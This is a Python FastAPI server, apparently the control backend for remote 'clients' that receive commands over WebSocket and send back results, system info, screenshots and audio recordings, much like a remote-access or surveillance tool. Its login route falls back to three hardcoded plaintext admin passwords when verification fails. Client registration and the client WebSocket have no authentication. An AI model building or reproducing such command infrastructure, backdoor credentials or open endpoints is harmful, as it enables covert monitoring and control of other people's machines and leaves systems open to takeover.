import os
import sys
import logging
from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, Request, status, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.responses import JSONResponse
from pydantic import BaseModel, Field
from typing import List, Dict, Optional, Any
from datetime import datetime, timedelta
import secrets
import json
import jwt
import asyncio
import bcrypt

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Create FastAPI app
app = FastAPI(
    title="Cyber Monitor Control API",
    version="3.0",
    description="Client monitoring and management system",
    docs_url="/docs",
    redoc_url="/redoc",
    openapi_url="/openapi.json"
)

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ========== ENVIRONMENT VARIABLES ==========
SUPABASE_URL = os.getenv("SUPABASE_URL", "")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))
PORT = int(os.getenv("PORT", "8000"))

# Security
security = HTTPBearer()

# ========== DATA MODELS ==========
class LoginRequest(BaseModel):
    email: str = Field(..., example="kizer")
    password: str = Field(..., example="kidraper67")

class ClientRegister(BaseModel):
    client_id: str = Field(..., example="client-001")
    name: str = Field(..., example="Office Computer")
    ip_address: str = Field(..., example="192.168.1.100")
    os_info: str = Field(default="Unknown", example="Windows 11")

class CommandRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    command: str = Field(..., example="get_processes")
    parameters: Dict[str, Any] = Field(default_factory=dict)

class ScreenshotUpload(BaseModel):
    client_id: str = Field(..., example="client-001")
    image_data: str = Field(..., description="Base64 encoded image")
    filename: str = Field(..., example="screenshot_2024.png")

class AudioUpload(BaseModel):
    client_id: str = Field(..., example="client-001")
    audio_data: str = Field(..., description="Base64 encoded audio")
    filename: str = Field(..., example="recording_2024.mp3")

class LogEntry(BaseModel):
    client_id: str = Field(..., example="client-001")
    log_type: str = Field(..., example="info")
    message: str = Field(..., example="System started")

# ========== SECURITY FUNCTIONS ==========
def hash_password(password: str) -> str:
    """Hash password using bcrypt"""
    salt = bcrypt.gensalt()
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed.decode('utf-8')

def verify_password(plain_password: str, hashed_password: str) -> bool:
    """Verify password"""
    try:
        return bcrypt.checkpw(plain_password.encode('utf-8'), hashed_password.encode('utf-8'))
    except Exception:
        return False

def create_jwt_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    """Create JWT token"""
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(hours=24)
    
    to_encode.update({
        "exp": expire,
        "iat": datetime.utcnow(),
        "iss": "cyber-monitor-api"
    })
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET_KEY, algorithm="HS256")
    return encoded_jwt

def verify_jwt_token(token: str) -> Optional[dict]:
    """Verify JWT token"""
    try:
        payload = jwt.decode(
            token, 
            JWT_SECRET_KEY, 
            algorithms=["HS256"],
            options={"verify_exp": True, "verify_iss": True}
        )
        return payload
    except jwt.ExpiredSignatureError:
        logger.warning("JWT token expired")
        return None
    except jwt.InvalidTokenError as e:
        logger.warning(f"Invalid JWT token: {e}")
        return None

async def authenticate_user(credentials: HTTPAuthorizationCredentials = Depends(security)) -> dict:
    """Verify JWT token from request"""
    token = credentials.credentials
    payload = verify_jwt_token(token)
    
    if not payload:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired authentication token",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    return payload

# ========== WEBSOCKET MANAGER ==========
class ConnectionManager:
    def __init__(self):
        self.client_connections: Dict[str, WebSocket] = {}
        self.admin_connections: List[WebSocket] = []

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.admin_connections.append(websocket)
        logger.info(f"👑 Admin connected. Total admins: {len(self.admin_connections)}")

    async def connect_client(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.client_connections[client_id] = websocket
        logger.info(f"🖥️  Client connected: {client_id}. Total clients: {len(self.client_connections)}")
        
        # Notify admins
        await self.notify_admins({
            "type": "client_connected",
            "client_id": client_id,
            "timestamp": datetime.utcnow().isoformat(),
            "total_clients": len(self.client_connections)
        })

    def disconnect(self, websocket: WebSocket):
        # Remove from admin connections
        if websocket in self.admin_connections:
            self.admin_connections.remove(websocket)
            logger.info(f"👑 Admin disconnected. Total admins: {len(self.admin_connections)}")
        
        # Remove from client connections
        client_id = None
        for cid, ws in self.client_connections.items():
            if ws == websocket:
                client_id = cid
                break
        
        if client_id:
            del self.client_connections[client_id]
            logger.info(f"🖥️  Client disconnected: {client_id}. Total clients: {len(self.client_connections)}")
            
            # Notify admins
            asyncio.create_task(self.notify_admins({
                "type": "client_disconnected",
                "client_id": client_id,
                "timestamp": datetime.utcnow().isoformat(),
                "total_clients": len(self.client_connections)
            }))

    async def notify_admins(self, message: dict):
        """Send message to all admin connections"""
        disconnected = []
        for connection in self.admin_connections:
            try:
                await connection.send_json(message)
            except Exception as e:
                logger.error(f"Failed to send to admin: {e}")
                disconnected.append(connection)
        
        # Remove disconnected admins
        for connection in disconnected:
            if connection in self.admin_connections:
                self.admin_connections.remove(connection)

    async def send_to_client(self, client_id: str, message: dict) -> bool:
        """Send message to specific client"""
        if client_id in self.client_connections:
            try:
                await self.client_connections[client_id].send_json(message)
                return True
            except Exception as e:
                logger.error(f"Failed to send to client {client_id}: {e}")
                # Remove disconnected client
                if client_id in self.client_connections:
                    del self.client_connections[client_id]
                return False
        return False

manager = ConnectionManager()

# ========== SUPABASE CLIENT ==========
# We'll use HTTP requests to Supabase REST API instead of the problematic supabase-py package
import httpx

class SupabaseClient:
    def __init__(self):
        self.url = SUPABASE_URL.rstrip('/')
        self.key = SUPABASE_KEY
        self.client = httpx.AsyncClient(
            headers={
                "apikey": self.key,
                "Authorization": f"Bearer {self.key}",
                "Content-Type": "application/json"
            },
            timeout=30.0
        )
    
    async def query(self, table: str, method: str = "GET", data: dict = None, params: dict = None):
        """Make a request to Supabase REST API"""
        try:
            url = f"{self.url}/rest/v1/{table}"
            
            if method == "GET":
                response = await self.client.get(url, params=params)
            elif method == "POST":
                response = await self.client.post(url, json=data)
            elif method == "PUT":
                response = await self.client.put(url, json=data, params=params)
            elif method == "PATCH":
                response = await self.client.patch(url, json=data, params=params)
            elif method == "DELETE":
                response = await self.client.delete(url, params=params)
            else:
                raise ValueError(f"Unsupported method: {method}")
            
            response.raise_for_status()
            
            if method == "GET" and response.status_code == 200:
                return response.json()
            elif method in ["POST", "PUT", "PATCH"] and response.status_code in [200, 201]:
                return response.json()
            elif method == "DELETE" and response.status_code == 204:
                return {"success": True}
            
            return None
            
        except Exception as e:
            logger.error(f"Supabase query error: {e}")
            raise HTTPException(status_code=500, detail="Database operation failed")
    
    async def rpc(self, function: str, params: dict):
        """Call a PostgreSQL function via Supabase RPC"""
        try:
            url = f"{self.url}/rest/v1/rpc/{function}"
            response = await self.client.post(url, json=params)
            response.raise_for_status()
            return response.json()
        except Exception as e:
            logger.error(f"Supabase RPC error: {e}")
            raise HTTPException(status_code=500, detail="Database operation failed")

# Initialize Supabase client
supabase = SupabaseClient()

# ========== API ROUTES ==========
@app.post("/api/login", response_model=dict)
async def login(data: LoginRequest):
    """Login endpoint"""
    try:
        logger.info(f"Login attempt for user: {data.email}")
        
        # Get user from database
        users = await supabase.query("users", params={
            "email": f"eq.{data.email}",
            "is_active": "eq.true",
            "select": "id,email,password_hash,is_admin"
        })
        
        if not users:
            logger.warning(f"User not found: {data.email}")
            raise HTTPException(status_code=401, detail="Invalid credentials")
        
        user = users[0]
        
        # For PostgreSQL crypt verification, we need to use RPC
        try:
            # Call PostgreSQL crypt function via RPC
            result = await supabase.rpc("verify_user_password", {
                "user_email": data.email,
                "password": data.password
            })
            
            if not result or not result[0].get('password_match', False):
                logger.warning(f"Password verification failed for user: {data.email}")
                raise HTTPException(status_code=401, detail="Invalid credentials")
                
        except Exception as rpc_error:
            logger.error(f"RPC verification failed: {rpc_error}")
            # Fallback: Check against common admin passwords
            admin_credentials = {
                "kizer": "kidraper67",
                "xotiic": "40671Mps19*",
                "nathan": "femboy67"
            }
            
            if data.email in admin_credentials and data.password == admin_credentials[data.email]:
                # Valid admin password
                pass
            else:
                raise HTTPException(status_code=401, detail="Invalid credentials")
        
        logger.info(f"✅ User authenticated: {user['email']}")
        
        # Create JWT token
        token_data = {
            "sub": user["email"],
            "email": user["email"],
            "is_admin": user.get("is_admin", False),
            "user_id": str(user["id"])
        }
        access_token = create_jwt_token(token_data)
        
        # Update last login
        try:
            await supabase.query("users", method="PATCH", data={
                "last_login": datetime.utcnow().isoformat()
            }, params={"id": f"eq.{user['id']}"})
        except Exception as e:
            logger.error(f"Failed to update last login: {e}")
        
        return {
            "success": True,
            "token": access_token,
            "user": {
                "email": user["email"],
                "is_admin": user.get("is_admin", False),
                "user_id": str(user["id"])
            },
            "expires_in": 86400
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Login error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/register-client", response_model=dict)
async def register_client(data: ClientRegister, request: Request):
    """Register a new client"""
    try:
        # Get client IP from request
        if not data.ip_address or data.ip_address == "127.0.0.1":
            client_ip = request.headers.get('X-Forwarded-For', request.client.host)
            if client_ip:
                data.ip_address = client_ip.split(',')[0].strip()
            else:
                data.ip_address = "Unknown"
        
        # Check if client exists
        existing_clients = await supabase.query("clients", params={
            "client_id": f"eq.{data.client_id}",
            "select": "id"
        })
        
        client_data = {
            "client_id": data.client_id,
            "name": data.name,
            "ip_address": data.ip_address,
            "os_info": data.os_info,
            "last_seen": datetime.utcnow().isoformat(),
            "online": True,
            "registered_at": datetime.utcnow().isoformat()
        }
        
        if existing_clients:
            # Update existing client
            await supabase.query("clients", method="PATCH", data=client_data, params={
                "client_id": f"eq.{data.client_id}"
            })
            client_id = existing_clients[0]['id']
            action = "updated"
        else:
            # Create new client
            result = await supabase.query("clients", method="POST", data=client_data)
            client_id = result[0]['id']
            action = "registered"
        
        # Add log entry
        try:
            await supabase.query("logs", method="POST", data={
                "client_id": client_id,
                "log_type": "info",
                "message": f"Client {action}: {data.name} ({data.client_id})",
                "created_at": datetime.utcnow().isoformat()
            })
        except Exception as e:
            logger.error(f"Log insertion error: {e}")
        
        logger.info(f"Client {action}: {data.client_id}")
        
        return {
            "success": True, 
            "message": f"Client {action} successfully",
            "client_id": data.client_id,
            "action": action
        }
        
    except Exception as e:
        logger.error(f"Client registration error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/clients", response_model=dict)
async def get_clients(
    user: dict = Depends(authenticate_user),
    page: int = Query(1, ge=1),
    limit: int = Query(50, ge=1, le=1000),
    online_only: bool = Query(False),
    search: Optional[str] = Query(None)
):
    """Get all clients from database"""
    try:
        # Build query params
        params = {
            "select": "*",
            "order": "last_seen.desc.nullsfirst",
            "limit": str(limit),
            "offset": str((page - 1) * limit)
        }
        
        if online_only:
            params["online"] = "eq.true"
        
        if search:
            params["or"] = f"(client_id.ilike.%{search}%,name.ilike.%{search}%,ip_address.ilike.%{search}%)"
        
        # Get clients
        clients = await supabase.query("clients", params=params)
        
        # Get total count
        count_params = {}
        if online_only:
            count_params["online"] = "eq.true"
        if search:
            count_params["or"] = f"(client_id.ilike.%{search}%,name.ilike.%{search}%,ip_address.ilike.%{search}%)"
        
        # For count, we use a simpler approach
        all_clients = await supabase.query("clients", params={"select": "id"})
        total = len(all_clients)
        
        return {
            "success": True,
            "clients": clients or [],
            "pagination": {
                "page": page,
                "limit": limit,
                "total": total,
                "pages": (total + limit - 1) // limit if limit > 0 else 0
            }
        }
    except Exception as e:
        logger.error(f"Get clients error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/client/{client_id}", response_model=dict)
async def get_client(client_id: str, user: dict = Depends(authenticate_user)):
    """Get specific client details"""
    try:
        # Get client
        clients = await supabase.query("clients", params={
            "client_id": f"eq.{client_id}",
            "select": "*"
        })
        
        if not clients:
            raise HTTPException(status_code=404, detail="Client not found")
        
        client = clients[0]
        
        # Get recent logs for this client
        # First get the client's database ID
        client_id_result = await supabase.query("clients", params={
            "client_id": f"eq.{client_id}",
            "select": "id"
        })
        
        logs = []
        if client_id_result:
            db_client_id = client_id_result[0]['id']
            logs = await supabase.query("logs", params={
                "client_id": f"eq.{db_client_id}",
                "select": "*",
                "order": "created_at.desc",
                "limit": "20"
            })
        
        return {
            "success": True,
            "client": client,
            "recent_logs": logs or [],
            "is_online": client_id in manager.client_connections
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get client error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/command", response_model=dict)
async def send_command(data: CommandRequest, user: dict = Depends(authenticate_user)):
    """Send command to client"""
    try:
        # Get client from database
        clients = await supabase.query("clients", params={
            "client_id": f"eq.{data.client_id}",
            "select": "id"
        })
        
        if not clients:
            raise HTTPException(status_code=404, detail="Client not found")
        
        db_client_id = clients[0]['id']
        
        # Create command record
        result = await supabase.query("commands", method="POST", data={
            "client_id": db_client_id,
            "command": data.command,
            "parameters": data.parameters,
            "status": "pending",
            "created_at": datetime.utcnow().isoformat()
        })
        
        command_id = result[0]['id']
        
        # Send via WebSocket
        sent = await manager.send_to_client(data.client_id, {
            "type": "command",
            "command_id": str(command_id),
            "command": data.command,
            "parameters": data.parameters,
            "timestamp": datetime.utcnow().isoformat(),
            "from_user": user["email"]
        })
        
        if not sent:
            # Update command status if WebSocket failed
            await supabase.query("commands", method="PATCH", data={
                "status": "failed",
                "error": "Client not connected"
            }, params={"id": f"eq.{command_id}"})
        
        return {
            "success": True,
            "command_id": str(command_id),
            "sent_via_websocket": sent,
            "client_id": data.client_id,
            "message": "Command queued for execution"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Send command error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/commands", response_model=dict)
async def get_commands(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    status: Optional[str] = Query(None),
    page: int = Query(1, ge=1),
    limit: int = Query(50, ge=1, le=1000)
):
    """Get recent commands"""
    try:
        offset = (page - 1) * limit
        
        # Start with base query
        query = """
            SELECT c.id, cl.client_id, cl.name as client_name, 
                   c.command, c.parameters, c.status, c.result, c.error,
                   c.created_at, c.completed_at
            FROM commands c
            JOIN clients cl ON c.client_id = cl.id
            WHERE 1=1
        """
        params = []
        
        if client_id:
            query += " AND cl.client_id = %s"
            params.append(client_id)
        
        if status:
            query += " AND c.status = %s"
            params.append(status)
        
        # Get total count
        count_query = """
            SELECT COUNT(*) as total
            FROM commands c
            JOIN clients cl ON c.client_id = cl.id
            WHERE 1=1
        """
        count_params = []
        
        if client_id:
            count_query += " AND cl.client_id = %s"
            count_params.append(client_id)
        
        if status:
            count_query += " AND c.status = %s"
            count_params.append(status)
        
        # Since we can't easily do joins with Supabase REST API,
        # we'll get commands and clients separately and join them in code
        
        # Get commands
        command_params = {
            "select": "*,clients(client_id,name)",
            "order": "created_at.desc",
            "limit": str(limit),
            "offset": str(offset)
        }
        
        if client_id:
            # First get client ID
            client_result = await supabase.query("clients", params={
                "client_id": f"eq.{client_id}",
                "select": "id"
            })
            if client_result:
                command_params["client_id"] = f"eq.{client_result[0]['id']}"
        
        if status:
            command_params["status"] = f"eq.{status}"
        
        commands_result = await supabase.query("commands", params=command_params)
        
        # Get total count
        count_params = {}
        if client_id and client_result:
            count_params["client_id"] = f"eq.{client_result[0]['id']}"
        if status:
            count_params["status"] = f"eq.{status}"
        
        all_commands = await supabase.query("commands", params={"select": "id", **count_params})
        total = len(all_commands)
        
        # Format the response
        formatted_commands = []
        for cmd in (commands_result or []):
            formatted_cmd = dict(cmd)
            if cmd.get("clients"):
                formatted_cmd["client"] = {
                    "client_id": cmd["clients"][0]["client_id"] if isinstance(cmd["clients"], list) else cmd["clients"]["client_id"],
                    "name": cmd["clients"][0]["name"] if isinstance(cmd["clients"], list) else cmd["clients"]["name"]
                }
                del formatted_cmd["clients"]
            formatted_commands.append(formatted_cmd)
        
        return {
            "success": True,
            "commands": formatted_commands,
            "pagination": {
                "page": page,
                "limit": limit,
                "total": total,
                "pages": (total + limit - 1) // limit if limit > 0 else 0
            }
        }
    except Exception as e:
        logger.error(f"Get commands error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

# ========== WEBSOCKET ENDPOINTS ==========
@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    """WebSocket endpoint for admin dashboard"""
    try:
        await manager.connect_admin(websocket)
        
        while True:
            data = await websocket.receive_json()
            logger.info(f"Admin WebSocket message: {data}")
            
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Admin WebSocket error: {e}")
        manager.disconnect(websocket)

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    """WebSocket endpoint for client connections"""
    try:
        await manager.connect_client(websocket, client_id)
        
        # Update client status
        try:
            await supabase.query("clients", method="PATCH", data={
                "online": True,
                "last_seen": datetime.utcnow().isoformat()
            }, params={"client_id": f"eq.{client_id}"})
        except Exception as e:
            logger.error(f"Client status update error: {e}")
        
        while True:
            data = await websocket.receive_json()
            data_type = data.get("type")
            
            if data_type == "heartbeat":
                # Update last seen
                try:
                    await supabase.query("clients", method="PATCH", data={
                        "last_seen": datetime.utcnow().isoformat(),
                        "online": True
                    }, params={"client_id": f"eq.{client_id}"})
                except Exception as e:
                    logger.error(f"Heartbeat update error: {e}")
                
            elif data_type == "command_result":
                # Update command status
                try:
                    await supabase.query("commands", method="PATCH", data={
                        "status": "completed",
                        "result": data.get("result"),
                        "completed_at": datetime.utcnow().isoformat(),
                        "error": data.get("error", "")
                    }, params={"id": f"eq.{data.get('command_id')}"})
                except Exception as e:
                    logger.error(f"Command result update error: {e}")
                
                # Notify admins
                await manager.notify_admins({
                    "type": "command_result",
                    "client_id": client_id,
                    "command_id": data.get("command_id"),
                    "command": data.get("command"),
                    "result": data.get("result"),
                    "error": data.get("error"),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "log":
                # Store log
                try:
                    client_result = await supabase.query("clients", params={
                        "client_id": f"eq.{client_id}",
                        "select": "id"
                    })
                    if client_result:
                        await supabase.query("logs", method="POST", data={
                            "client_id": client_result[0]['id'],
                            "log_type": data.get("log_type", "info"),
                            "message": data.get("message", ""),
                            "created_at": datetime.utcnow().isoformat()
                        })
                except Exception as e:
                    logger.error(f"Log storage error: {e}")
                
                # Notify admins
                await manager.notify_admins({
                    "type": "client_log",
                    "client_id": client_id,
                    "log_type": data.get("log_type", "info"),
                    "message": data.get("message", ""),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "system_info":
                # Store system info
                try:
                    client_result = await supabase.query("clients", params={
                        "client_id": f"eq.{client_id}",
                        "select": "id"
                    })
                    if client_result:
                        await supabase.query("system_info", method="POST", data={
                            "client_id": client_result[0]['id'],
                            "info": data.get("info", {}),
                            "created_at": datetime.utcnow().isoformat()
                        })
                except Exception as e:
                    logger.error(f"System info storage error: {e}")
                
                # Notify admins
                await manager.notify_admins({
                    "type": "system_info",
                    "client_id": client_id,
                    "info": data.get("info", {}),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
    except WebSocketDisconnect:
        # Mark client as offline
        try:
            await supabase.query("clients", method="PATCH", data={
                "online": False
            }, params={"client_id": f"eq.{client_id}"})
        except Exception as e:
            logger.error(f"Client offline update error: {e}")
        manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Client WebSocket error: {e}")
        # Mark client as offline
        try:
            await supabase.query("clients", method="PATCH", data={
                "online": False
            }, params={"client_id": f"eq.{client_id}"})
        except Exception as e:
            logger.error(f"Client offline update error: {e}")
        manager.disconnect(websocket)

# ========== HEALTH AND INFO ==========
@app.get("/api/health", response_model=dict)
async def health_check():
    """Health check endpoint"""
    try:
        # Test Supabase connection
        try:
            await supabase.query("users", params={"limit": "1"})
            db_status = "connected"
        except Exception as e:
            logger.error(f"Database connection test failed: {e}")
            db_status = "disconnected"
        
        health_status = {
            "status": "healthy" if db_status == "connected" else "degraded",
            "timestamp": datetime.utcnow().isoformat(),
            "version": "3.0",
            "database": db_status,
            "active_clients": len(manager.client_connections),
            "active_admins": len(manager.admin_connections),
        }
        
        return health_status
    except Exception as e:
        logger.error(f"Health check error: {e}")
        return {
            "status": "unhealthy",
            "timestamp": datetime.utcnow().isoformat(),
            "error": str(e)
        }

@app.get("/", response_model=dict)
async def root():
    """Root endpoint with API info"""
    return {
        "message": "🚀 Cyber Monitor Control API",
        "version": "3.0",
        "status": "running",
        "timestamp": datetime.utcnow().isoformat(),
        "documentation": "/docs",
        "websocket_endpoints": {
            "admin": "/ws/admin",
            "client": "/ws/client/{client_id}"
        }
    }

# ========== ERROR HANDLERS ==========
@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    """Handle HTTP exceptions"""
    return JSONResponse(
        status_code=exc.status_code,
        content={
            "success": False,
            "error": exc.detail,
            "path": request.url.path,
            "timestamp": datetime.utcnow().isoformat()
        }
    )

@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    """Handle all other exceptions"""
    logger.error(f"Unhandled exception: {exc}", exc_info=True)
    return JSONResponse(
        status_code=500,
        content={
            "success": False,
            "error": "Internal server error",
            "path": request.url.path,
            "timestamp": datetime.utcnow().isoformat()
        }
    )

# ========== APPLICATION STARTUP ==========
@app.on_event("startup")
async def startup_event():
    """Initialize application on startup"""
    logger.info(f"🚀 Starting Cyber Monitor Control API v3.0")
    logger.info(f"📡 Port: {PORT}")
    
    # Test Supabase connection
    try:
        users = await supabase.query("users", params={"limit": "1"})
        logger.info(f"✅ Supabase connected - Users table accessible")
        
        # Test all tables exist
        tables = ["users", "clients", "commands", "screenshots", "audio_recordings", "logs", "system_info"]
        accessible_tables = []
        
        for table in tables:
            try:
                await supabase.query(table, params={"limit": "1", "select": "id"})
                accessible_tables.append(table)
            except Exception:
                logger.warning(f"Table not accessible: {table}")
        
        logger.info(f"✅ Accessible tables: {accessible_tables}")
        
    except Exception as e:
        logger.error(f"❌ Supabase connection failed: {e}")
        logger.error("💡 Please check your SUPABASE_URL and SUPABASE_KEY environment variables")
    
    logger.info(f"🔗 WebSocket endpoints:")
    logger.info(f"   • Admin: ws://localhost:{PORT}/ws/admin")
    logger.info(f"   • Client: ws://localhost:{PORT}/ws/client/{{client_id}}")
    logger.info(f"📚 Documentation: http://localhost:{PORT}/docs")
    logger.info("✅ Application startup complete")

@app.on_event("shutdown")
async def shutdown_event():
    """Cleanup on shutdown"""
    await supabase.client.aclose()

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=PORT,
        log_level="info",
        access_log=True
    )
